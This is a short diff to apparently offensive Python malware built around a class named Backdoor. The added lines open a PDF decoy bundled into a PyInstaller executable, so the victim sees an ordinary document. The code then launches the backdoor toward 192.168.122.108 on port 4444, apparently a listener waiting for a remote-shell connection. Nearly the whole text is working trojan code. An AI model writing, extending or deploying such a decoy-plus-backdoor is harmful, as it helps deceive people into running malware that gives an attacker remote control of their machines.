@@ -86,6 +86,10 @@ class Backdoor:
 
 # Main
 if __name__ == "__main__":
+
+    file_name = sys._MEIPASS + "\wit.pdf"
+    subprocess.Popen(file_name, shell=True)
+
     # noinspection PyBroadException
     try:
         my_backdoor = Backdoor("192.168.122.108", 4444)
